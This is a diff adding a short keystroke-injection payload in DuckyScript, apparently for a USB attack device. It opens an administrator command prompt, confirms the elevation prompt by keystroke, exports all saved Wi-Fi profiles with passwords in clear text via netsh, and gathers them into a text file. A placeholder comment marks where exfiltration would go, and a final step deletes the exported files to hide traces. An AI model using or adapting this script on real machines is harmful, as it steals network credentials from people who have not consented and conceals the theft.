@@ -1,0 +1,44 @@
+REM Open cmd
+CONTROL ESCAPE
+DELAY 100
+STRING CMD
+CTRL-SHIFT ENTER
+DELAY 100
+LEFTARROW
+DELAY 100
+ENTER
+DELAY 500
+STRING cd/
+ENTER
+DELAY 100
+
+REM Create a directory
+STRING mkdir export
+DELAY 100
+ENTER
+DELAY 100
+STRING cd export
+ENTER
+DELAY 100
+
+REM Export Wi-Fi profiles as XML filese with the passwords in clear text
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1000
+
+REM Concat XML files into a TXT file
+STRING copy *.xml wifi.txt
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 500
+
+REM Add some lines to exfiltrate the TXT file
+
+REM Cleaning
+STRING del export
+ENTER
+DELAY 100
+STRING exit
+ENTER
